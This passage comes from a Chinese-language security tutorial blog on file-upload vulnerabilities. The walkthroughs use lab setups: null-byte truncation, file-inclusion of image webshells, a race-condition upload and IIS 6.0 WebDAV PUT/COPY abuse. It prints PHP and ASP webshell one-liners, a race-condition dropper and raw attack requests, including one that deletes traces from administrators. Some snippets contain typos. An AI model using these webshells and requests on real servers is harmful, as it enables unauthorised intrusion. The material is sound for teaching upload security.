<p>修改完成后运行包通过，页面会返回空白图片，右击点击图片地址。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083622923.png" alt="image-20200406083622923"></p>
<p>在新的页面将地址粘贴，粘贴完不能直接执行，需要将红线处的内容删除，也就是1.php后的内容删除，否则报错</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083751706.png" alt="image-20200406084954651"></p>
<p>删除之后在进入页面，返回phpinof的页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083843607.png" alt="image-20200406085245844"></p>
<p>这就是GTE截断。</p>
<h5 id="3、POST型00截断"><a href="#3、POST型00截断" class="headerlink" title="3、POST型00截断"></a>3、POST型00截断</h5><p>除了常见的检查文件名后缀的方法外，有的应用，还会通过判断上传文件的文件头来验证文件的类型。比如以下代码</p>
<p>在POST请求中，%00不会被自动解码，需要在16进制中进行修改00</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">     &#x2F;&#x2F; 这样就可以在date(&quot;YmdHis&quot;)后面加入0x00截断，使$file_ext被添加的文件后缀名不会被执行成功</span><br><span class="line">        $img_path &#x3D; $_POST[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">        </span><br><span class="line">	&#x2F;&#x2F; 使用move_uploaded_file将临时上传的文件$temp_file保存到$img_path路径下，并且进行了随机化重命名</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建一个php文件，写入一句话木马，然后更改为可上传格式，进行上传burp抓包</p>
<p>这里加入空格的原因是因为%00不会被自动解码，需要在16进制中修改，因为加入空格已知他是16进制的20，所以在HEX只需要找到位置将20修改为00就可以截断</p>
<p>为了绕过类似的MIME Sniff的功能，常见的攻击技巧是伪造一个合法的文件头，而将真实的PHP等脚本代码附在合法的文件头之后</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406084954651.png" alt="image-20200406083751706"></p>
<p>在HEX子模块中找到1.php空格，找到20</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085245844.png" alt="image-20200406083843607"></p>
<p>找到20之后，要将他修改为00</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085344970.png" alt="image-20200406085759324"></p>
<p>修改执行点击forward进行上传，返回一个空白图片，右键复制图片连接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085602285.png" alt="image-20200406085602285"></p>
<p>在新的浏览器打开，当然还是需要将php格式后面的删除，成功访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085759324.png" alt="image-20200406085344970"></p>
<p><strong>注意：</strong>截断需要关闭GPC否则会上传失败</p>
<h5 id="4、一句话代码执行Webshell"><a href="#4、一句话代码执行Webshell" class="headerlink" title="4、一句话代码执行Webshell"></a>4、一句话代码执行Webshell</h5><p>使用php中的函数system执行GET提交的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	&#x2F;&#x2F; 当参数不为空时，执行if下的语句</span><br><span class="line">	&#x2F;&#x2F; 当if判断输入为空时，执行else语句</span><br><span class="line">		if($_GET)&#123;</span><br><span class="line">				$cmd&#x3D;$_GET[&quot;cmd&quot;];</span><br><span class="line">				system($cmd);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">				echo &quot;no cmd&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>因为我们并没有提交任何参数，所以返回为no cmd为空</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406090751572.png" alt="image-20200406090948967"></p>
<p>如果写入cmd=ipconfig，会返回ipconfig的详细信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406090948967.png" alt="image-20200406090751572"></p>
<p>如果上感觉太乱，可以查看源码，这样就会整齐的列下来</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406091058283.png" alt="image-20200406094728548"></p>
<p>在某些时候JS会限制右键，可以使用   “<strong>view-source:URL</strong>”   来查看源代码</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;web.php?cmd&#x3D;ipconfig</span><br></pre></td></tr></table></figure>

<h4 id="图片WebShell上传"><a href="#图片WebShell上传" class="headerlink" title="图片WebShell上传"></a>图片WebShell上传</h4><h5 id="1、图片WebShell制作"><a href="#1、图片WebShell制作" class="headerlink" title="1、图片WebShell制作"></a>1、图片WebShell制作</h5><p>在服务端的PHP代码中，对于用户上传的文件做文件类型检查，查看文件格式是否符合上传规范。可以检查文件二进制格式的前几个字节，从而判断文件类型是否正确。</p>
<p>新建php文件将其写入代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406094531954.png" alt="image-20200406095152978"></p>
<p>将PHP格式改为jpg格式</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406094728548.png" alt="image-20200406091058283"></p>
<h5 id="2、上传图片WebShell文件"><a href="#2、上传图片WebShell文件" class="headerlink" title="2、上传图片WebShell文件"></a>2、上传图片WebShell文件</h5><p>将制作好的图片WebShell上传到服务器。</p>
<p>其中可能Content-Type验证。修改为image/gif或者image/jpg 符合当前文件类型的MIME</p>
<p>进行上传然后使用Burp抓包，Forward进行放行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406095120594.png" alt="image-20200406094531954"></p>
<p>返回空白图片，复制图片地址，在新的页面打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406095152978.png" alt="image-20200406095225081"></p>
<p>发现页面打开，但是并没有phpinfo的界面，说明出错了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406095225081.png" alt="image-20200406095120594"></p>
<p>因为文件我们直接编写的，他没有直接显示，这样的话他还是没有直接显示对应的phpinfo，对于这种情况就要使用对用的文件包含漏洞进行对应的测试，才能执行对应的phpinfo</p>
<h5 id="3、文件包含漏洞代码分析"><a href="#3、文件包含漏洞代码分析" class="headerlink" title="3、文件包含漏洞代码分析"></a>3、文件包含漏洞代码分析</h5><p>在PHP中，使用include、require、include_once、require_once函数包含的文件都会被当做PHP代码执行，无论文件的名称是什么，只要符号文件内容符合PHP代码规范，都会被当作PHP代码执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">		if($_GET)&#123;</span><br><span class="line">				include($_GET[&quot;file&quot;]);</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">				echo &quot;not get args file&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="4、结合文件包含输出phpinfo"><a href="#4、结合文件包含输出phpinfo" class="headerlink" title="4、结合文件包含输出phpinfo"></a>4、结合文件包含输出phpinfo</h5><p>将上面代码放在upload下，将地址复制打开，返回not get args file，说明代码没问题</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406101945790.png" alt="image-20200406104838474"></p>
<p>在php后面加上?file=一句话木马的图片名称，将红线处的图片名称复制到蓝线处</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406102158810.png" alt="image-20200406102158810"></p>
<p>利用存在文件包含的PHP页面，包含上传的图片WebShell，从而触发WebShell，输出对应的phpinfo</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406101824355.png" alt="image-20200406111040176"></p>
<h4 id="竞争条件"><a href="#竞争条件" class="headerlink" title="竞争条件"></a>竞争条件</h4><p>upload-labs 17</p>
<h5 id="1、文件上传过程介绍"><a href="#1、文件上传过程介绍" class="headerlink" title="1、文件上传过程介绍"></a>1、文件上传过程介绍</h5><p>文件上传过程：</p>
<p>从浏览器上传到服务器，服务器接收到浏览器上传的文件时，服务器就会获取对应的文件，获取文件之后他不会立即将文件保存到对应的网站目录下，而是会将他保存到系统的临时文件当中，保存到临时文件之后，当我们在对应的脚本当中使用对应的重命名函数时，才会将临时文件移动到我们对应的上传目录下</p>
<p>例如：我们在php脚本语言当中使用move_uploade这个函数之后，才会将文件真实的上传到咱们对应的站点目录下。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406104838474.png" alt="image-20200406101945790"></p>
<h5 id="2、竞争条件原理介绍"><a href="#2、竞争条件原理介绍" class="headerlink" title="2、竞争条件原理介绍"></a>2、竞争条件原理介绍</h5><p>网站逻辑：</p>
<p>1、网站允许上传任意文件，然后检查上传文件是否包含WebShell，如果包含删除该文件</p>
<p>2、网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件</p>
<p>问题：</p>
<p>在删除之前如果访问到上传的php文件或者其他脚本文件，从而执行上传中的php代码或者其他脚本代码</p>
<p>例如：上传文件代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#39;);</span><br><span class="line">?&gt;</span><br><span class="line">假如以上代码命名为WebShell.php，那么再删除WebShell.php时，首先访问了WebShell.php，这时候就会在相应的WebShell.php当前目录下新建一个shell.php一句话脚本，从而可以使用菜刀进行连接</span><br><span class="line"></span><br><span class="line">通俗点说就是当你上传完WebShell.php文件，网站要检查你这个文件是不是包含了恶意脚本，检查的时候需要打开WebShell.php文件，当打开的时候就执行了php脚本，因为检查和删除是需要时间的，所以就在这个时间段内生成了一个shell.php脚本，将&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;这段代码放进了 shell.php中，这样就可以使用菜刀连接了</span><br></pre></td></tr></table></figure>

<h5 id="3、竞争条件代码分析"><a href="#3、竞争条件代码分析" class="headerlink" title="3、竞争条件代码分析"></a>3、竞争条件代码分析</h5><p>先进行上传，然后进行判断与删除，利用时间差进行WebShell上传。</p>
<p>首先进行了对应的上传，上传之后才进行判断，判断上传的文件是否符合对应的条件，符合类型为jpg，png，gif，如果符合使用rename()函数进行重命名，如果不符合使用unlink()函数进行删除，这个时候就可以利用判断和删除的时间差来进行对应的webshell上传，从而访问到上传的php脚本</p>
<p>因为在move_uoloaded_file(){函数后面那里并没有进行判断，这个时候就可因进行上传比如一个1.php，网站在删除之前访问到1.php，那么1.php脚本当中内容就会执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406111040176.png" alt="image-20200406101824355"></p>
<h5 id="4、竞争条件文件上传利用"><a href="#4、竞争条件文件上传利用" class="headerlink" title="4、竞争条件文件上传利用"></a>4、竞争条件文件上传利用</h5><p>提前不断访问代码文件，然后上传，最终使用才到连接一句话webshell</p>
<p>Python发送http请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import   requests</span><br><span class="line">while   true:</span><br><span class="line">		requests.get(&quot;路径&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406170912193.png" alt="image-20200406131948511"></p>
<p>使用单一测试速度达不到，无法在删除之前进行对应的访问，为了达成实验目的，在删除之前加一个sleep进行延迟，时间延迟5秒</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406131948511.png" alt="image-20200406170739475"></p>
<p>先查看upload，发现upload下没有任何文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406170739475.png" alt="image-20200406170957931"></p>
<p>先执行text.py，使用python脚本进行不断地发送http请求，连接webshell.php</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406170957931.png" alt="image-20200406170912193"></p>
<p>在kali中进行对应的上传</p>
<p>wireshark下查看可以看到不断地请求webshell.php</p>
<p><img src="/2020/04/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload%5Cimage-20200407164143221.png" alt="image-20200407164143221"></p>
<p>查看webshell.php中的代码，写入的shell.php和一句话木马</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406173056947.png" alt="image-20200406171117818"></p>
<p>页面选择webshell.php进行提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406173400254.png" alt="image-20200406173056947"></p>
<p>可以查看upload文件下，发现shell.php成功上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406173242871.png" alt="image-20200406173748738"></p>
<p>打开shell.php查看内容，这是一句话木马</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406173748738.png" alt="image-20200406173400254"></p>
<p>上传一句话木马后可以使用菜刀进行连接</p>
<h4 id="中间件解析漏洞-IIS6-0"><a href="#中间件解析漏洞-IIS6-0" class="headerlink" title="中间件解析漏洞 - IIS6.0"></a>中间件解析漏洞 - IIS6.0</h4><h5 id="IIS文件解析问题"><a href="#IIS文件解析问题" class="headerlink" title="IIS文件解析问题"></a>IIS文件解析问题</h5><p>IIS 6在处理文件解析时，也出过一些漏洞。前面提到的0X00字符截断文件名，在IIS和Windows环境下出过类似的漏洞，不过截断字符变成了” ; “</p>
<p>当文件名为123.asp;111.jpg时，IIS 6会将文件解析为abc.asp，文件名被阶段了，从而导致脚本被执行。比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.127.25&#x2F;123.asp;111.jpg</span><br></pre></td></tr></table></figure>

<p>会执行123.asp，而不会管111.jpg</p>
<h5 id="1、IIS6-0解析漏洞介绍"><a href="#1、IIS6-0解析漏洞介绍" class="headerlink" title="1、IIS6.0解析漏洞介绍"></a>1、IIS6.0解析漏洞介绍</h5><p>解析漏洞描述：</p>
<p>解析漏洞就是上传到web服务器上的这个文件并不是.asp命名的这样一个文件，会被服务器IIS6.0这个服务器解析为asp文件，这时候就造成了非.asp后缀名的文件，被当做asp脚本执行，从而执行其中的代码</p>
<h5 id="注意：这两个IIS漏洞，是需要在服务器的本地硬盘上确实存在这样的文件或者文件夹，若只是通过Web应用映射出来的URL，则是无法触发的"><a href="#注意：这两个IIS漏洞，是需要在服务器的本地硬盘上确实存在这样的文件或者文件夹，若只是通过Web应用映射出来的URL，则是无法触发的" class="headerlink" title="注意：这两个IIS漏洞，是需要在服务器的本地硬盘上确实存在这样的文件或者文件夹，若只是通过Web应用映射出来的URL，则是无法触发的"></a>注意：这两个IIS漏洞，是需要在服务器的本地硬盘上确实存在这样的文件或者文件夹，若只是通过Web应用映射出来的URL，则是无法触发的</h5><p>1）当监理*.asp格式的文件夹时，其目录下的任意文件讲被IIS当作asp文件解析。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%&#x3D;anoe()%&gt;</span><br></pre></td></tr></table></figure>

<p>在Windows sever2000当中进行测试，新建了一个站点</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406203537641.png" alt="image-20200406173242871"></p>
<p>打开浏览器进行访问，可以正常打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406203603101.png" alt="image-20200406203537641"></p>
<p>在站点的根目录新建一个文件夹1.asp</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406203656148.png" alt="image-20200406203844038"></p>
<p>下面进行访问，访问1.asp下的1.txt文本，发现并没有输入NOW而是将文本变成了asp执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406203844038.png" alt="image-20200406204342863"></p>
<p>2）当文件*.asp;1.jpg IIS6.0同样会将文件作为asp文件解析</p>
<p>在根目录下新建一个a.asp;1.txt</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406204342863.png" alt="image-20200406203656148"></p>
<p>在文本中写入   &lt;%NOW()%&gt;   asp内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406204447988.png" alt="image-20200406203743363"></p>
<p>进行访问这个网址a.asp;1.txt，页面也没有返回NOW而是返回了当前时间</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406204520970.png" alt="image-20200406204447988"></p>
<h5 id="2、IIS6-0-PUT上传原理"><a href="#2、IIS6-0-PUT上传原理" class="headerlink" title="2、IIS6.0 PUT上传原理"></a>2、IIS6.0 PUT上传原理</h5><p>WebDAV基于HTTP1.1协议的通信协议使得HTTP支持PUT MOVE COPY DELETE等功能，它所包含的PUT方法，允许用户上传文件到指定路径下。</p>
<p>在许多Web Sever 中，默认都禁用了此方法，或者对能够上传的文件类型做了严格限制。但在IIS中，如果目录支持写权限，同时开启了WebDav，则会支持PUT方法，再结合MOVE方法，就能够将原本只允许上传文本文件改写为脚本文件，从而执行WebShell。MOVE能否执行成功取决于IIS服务器是否勾选了”脚本资源访问”复选框</p>
<p>如果要实施这个攻击过程，攻击者应先通过<strong>OPTIONS方法探测服务器支持的HTTP方法类型</strong>，如果支持PUT，则使用PUT上传一个指定的文本文件，最后再通过MOVE改写脚本文件</p>
<p>​        1、探测是否存在IIS PUT 漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 如果探测过程中出现了对应支持的这些方法，那就说明存在IIS PUT漏洞</span><br><span class="line">&#x2F;&#x2F; 当然也有很多中间件支持PUT</span><br><span class="line">OPTIONS&#x2F;HTTP1.1</span><br><span class="line">Host:www.xxx.com</span><br></pre></td></tr></table></figure>

<p>​        2、上传txt文本文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 如果上面探测出PUT方法，就可以使用PUT然后设置对应的上传位置，将他传到根目录下的a.txt</span><br><span class="line">PUT &#x2F;a.txt HTTP1.1</span><br><span class="line">Host：www.xxx.com</span><br><span class="line">Content-Length：30	</span><br><span class="line"></span><br><span class="line">&lt;%eval reques(&quot;chopper&quot;)%&gt;</span><br></pre></td></tr></table></figure>

<p>​        3、通过Move或Copy重名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 上传之后是上传了一个txt文本文档，这时候就需要copy将其拷贝到其他位置</span><br><span class="line">&#x2F;&#x2F; 比如将a.txt拷贝到cmd.asp,这时候txt文件就会被重命名为cmd.asp</span><br><span class="line">COPY&#x2F;a.txt HTTP1.1 </span><br><span class="line">HOST：www.xxx.com</span><br><span class="line">Destination：http:&#x2F;&#x2F;www.xxx.com&#x2F;cmd.asp</span><br></pre></td></tr></table></figure>

<p>​        4、删除</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 为了防止多余的txt文档被系统管理员看到，这个时候就是用delete来删除根目录下的a.txt</span><br><span class="line">DELETE&#x2F;a.txt HTTP1.1</span><br><span class="line">Host:www.xxx.com</span><br></pre></td></tr></table></figure>

<h5 id="3、IIS6-0-PUT上传探测"><a href="#3、IIS6-0-PUT上传探测" class="headerlink" title="3、IIS6.0 PUT上传探测"></a>3、IIS6.0 PUT上传探测</h5><p>可以使用OPTIONS探测，也可以使用自动化工具探测</p>
<p>自动化工具探测</p>
<p>使用nikto探测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-nikto -h IP地址</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<p><img src="/2020/04/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload%5Cimage-20200407165220436.png" alt="image-20200407165220436"></p>
<p>因为支持这几个方法所以可以确定存在IIS漏洞</p>
<h5 id="4、IIS6-0-PUT上传利用"><a href="#4、IIS6-0-PUT上传利用" class="headerlink" title="4、IIS6.0 PUT上传利用"></a>4、IIS6.0 PUT上传利用</h5><h5 id="以下内容中的asp写错了多加了一个括号和-符号"><a href="#以下内容中的asp写错了多加了一个括号和-符号" class="headerlink" title="以下内容中的asp写错了多加了一个括号和@符号"></a>以下内容中的asp写错了多加了一个括号和@符号</h5><p>正确格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% eval request(&quot;cmd&quot;)%&gt;</span><br></pre></td></tr></table></figure>

<p>利用burpsuite进行IIS PUT漏洞利用。先OPTIONS探测、PUT、MOVE、DELETE</p>
<p>截断对应数据包，修改对应的方法OPTIONS进行探测，如果返回了200，并且返回了对应的支持方法，这个时候可以判断他是支持IIS PUT</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406213544157.png" alt="image-20200406211007871"></p>
<p>探测完就要上传一个文本</p>
<p>在红线处将OPTIONS改为PUT/123.txt，在紫色下划线地方写入asp脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@eval request(&quot;cmd&quot;))%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406213837106.png" alt="image-20200406213837106"></p>
<p>修改为配置点击GO，这样根目录下就会多一个123.txt文本，也可以在右面response中看到HTTP相应是201也就是创建</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406214030356.png" alt="image-20200406214030356"></p>
<p>在根目录查看是否有一个123.txt，如果有查看123.txt中的内容</p>
<p>发现确实凡在，并且内容也是asp脚本内容</p>
<p><img src="/2020/04/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload%5Cimage-20200407165452805.png" alt="image-20200407165452805"></p>
<p>上传完成之后就需要进行MOVE重命名或者COPY拷贝</p>
<p>打开网址输入网址的URL进行抓包，将其配置信息修改</p>
<p>将GET修改为COPY，拷贝的内容是123.txt，可以将Host以下的内容全部删除</p>
<p>写入Destination：URL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Destination：http:&#x2F;&#x2F;192.168.1.110&#x2F;123.asp;aaa.jpg</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406215120458.png" alt="image-20200407090323746"></p>
<p>点击GO进行执行，返回HTTP201表示完成</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406215207644.png" alt="image-20200407085144478"></p>
<p>查看根目录下是否有这个文件，发现文件确实存在，说明执行成功</p>
<p>当然也可以改为其他名称，但要符合解析漏洞的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406215305346.png" alt="image-20200407090357703"></p>
<h5 id="以上代码存在错误，已在开头表明，这里已经修改完成"><a href="#以上代码存在错误，已在开头表明，这里已经修改完成" class="headerlink" title="以上代码存在错误，已在开头表明，这里已经修改完成"></a>以上代码存在错误，已在开头表明，这里已经修改完成</h5><p>使用菜刀进行连接，成功连接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406220049997.png" alt="image-20200406213544157"></p>
<h4 id="Apache文件解析漏洞"><a href="#Apache文件解析漏洞" class="headerlink" title="Apache文件解析漏洞"></a>Apache文件解析漏洞</h4><h5 id="1、Apache环境搭建"><a href="#1、Apache环境搭建" class="headerlink" title="1、Apache环境搭建"></a>1、Apache环境搭建</h5><p>Apache和PHP采用module的方式结合</p>
<p>只有Apache和php采用moudule的方式来进行结合时才有解析漏洞，虽然可以和其他的结合但是不存在解析漏洞</p>
<p>这样就需要下载单独的Apache和PHP，在Apache下hettpd.conf文件，将对应的PHP文件加载进来</p>
<p>安装完Apache后在文件夹下的conf中的httpd.conf进行配置</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407083714517.png" alt="image-20200406214803116"></p>
<p>加载对应的模块LoadModule php5_module “路径”将文件中在带的dll进行加载</p>
<p>设置PHP初始化目录PHPIniDir “目录”</p>
<p>以及对一些文件进行解析AddType application/x-httpd-php   .php   .html  .htm，加上这些后缀名是只对这些后缀名进行解析</p>
<p>如果使用这种情况，会出现错误的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407084557317.png" alt="image-20200406215120458"></p>
<h5 id="2、Apache解析漏洞介绍"><a href="#2、Apache解析漏洞介绍" class="headerlink" title="2、Apache解析漏洞介绍"></a>2、Apache解析漏洞介绍</h5><p>因为Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名也可以拥有多个扩展名。Apache认为应该从右到左开始判断解析方法的。如果最右侧的扩展名不可识别的，就继续往左判断，直到判断到文件名为止</p>
<p>官方解释：<a href="http://httpd.apache.org/docs/current/mod/directive-dict.html" target="_blank" rel="noopener">http://httpd.apache.org/docs/current/mod/directive-dict.html</a></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407085144478.png" alt="image-20200406215207644"></p>
<p>比如：1.php.xxxx 这个文件有两个文件后缀名，一个是php一个是xxxx，当Apache从右向左进行解析时，先解析后缀名.xxxx发现不然是继续向左解析，解析到.php，Apache认识就会当做PHP解析</p>
<h5 id="注意：Apache本身是不能解析php文件，而是调用php模块来解析php文件，Apache只是判断这个文件是不是php如果是就交给php模块解析，Apache本身不具有解析功能，只是判断文件类型。"><a href="#注意：Apache本身是不能解析php文件，而是调用php模块来解析php文件，Apache只是判断这个文件是不是php如果是就交给php模块解析，Apache本身不具有解析功能，只是判断文件类型。" class="headerlink" title="注意：Apache本身是不能解析php文件，而是调用php模块来解析php文件，Apache只是判断这个文件是不是php如果是就交给php模块解析，Apache本身不具有解析功能，只是判断文件类型。"></a>注意：Apache本身是不能解析php文件，而是调用php模块来解析php文件，Apache只是判断这个文件是不是php如果是就交给php模块解析，Apache本身不具有解析功能，只是判断文件类型。</h5><h5 id="3、解析漏洞利用演示"><a href="#3、解析漏洞利用演示" class="headerlink" title="3、解析漏洞利用演示"></a>3、解析漏洞利用演示</h5><p>在站点目录下新建一个1.php.xxxx文件，xxxx文件后缀名为无法识别的后缀名。其中内容为phpinfo();</p>
<p>在Apache下的htdocs下新建一个1.php .xxxx</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407090153504.png" alt="image-20200406215305346"></p>
<p>打开cmd使用ipconfig获取ip地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407090323746.png" alt="image-20200406220049997"></p>
<p>在浏览器当中进行访问，这样就会输出对应的phpinfo，由此可以确定这个文件会被Apache当做php文件格式，并传递给php.exe进行执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407090357703.png" alt="image-20200407090153504"></p>
<p>传递到这里，进行执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407090628805.png" alt="image-20200407083714517"></p>
<h5 id="4、利用场景介绍"><a href="#4、利用场景介绍" class="headerlink" title="4、利用场景介绍"></a>4、利用场景介绍</h5><p>在Web程序总存在文件上传，但是有黑名单验证时，利用该解析漏洞可以上传对应各WebShell到目标服务器</p>
<p>比如：</p>
<p>传递一句话木马，使用菜刀连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	@vale($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>例如使用1.php.xxxx的文件内容修改为一句话木马，然后使用中国菜刀进行连接，连接时同样是这个文件，但是会被Apache当做php来进行判断，判断它为php文件，这时候就会调用php.exe进行解析，然后就成功连接到中国菜刀的一句话WebShell</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407091010103.png" alt="image-20200407084557317"></p>
<h4 id="文件上传修复建议"><a href="#文件上传修复建议" class="headerlink" title="文件上传修复建议"></a>文件上传修复建议</h4><ul>
<li><p>通过白名单的方式判断文件后缀名是否合法</p>
</li>
<li><p>对上传的文件名进行重命名。</p>
</li>
<li><pre><code>例如：
    rand(10,99).date(&quot;YmdHis&quot;).&quot;.jpg&quot;。</code></pre></li>
</ul>
<h4 id="设计安全的文件上传功能"><a href="#设计安全的文件上传功能" class="headerlink" title="设计安全的文件上传功能"></a>设计安全的文件上传功能</h4><h5 id="1、文件上传的目录设置为不可执行"><a href="#1、文件上传的目录设置为不可执行" class="headerlink" title="1、文件上传的目录设置为不可执行"></a>1、文件上传的目录设置为不可执行</h5><p>只要web容器无法解析该目录下的内容，即使攻击者上传了脚本文件，服务器本身也不会收到影响，因此此点至关重要。在实际应用中，很多大型网站的上传应用，文件上传后会放到独立的存储上做静态文件处理，一方面方便使用缓存加速，降低性能损耗；另一方面也杜绝了脚本执行的可能。</p>
